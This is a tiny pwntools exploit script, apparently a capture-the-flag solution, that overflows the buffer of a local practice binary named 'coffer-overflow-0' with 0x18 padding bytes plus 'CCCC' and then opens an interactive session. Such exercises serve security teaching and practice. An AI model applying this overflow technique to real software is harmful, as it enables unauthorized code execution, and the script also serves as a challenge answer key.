from pwn import *

p = process("./bin/coffer-overflow-0")

p.sendline("A" * 0x18 + "CCCC")

p.interactive()
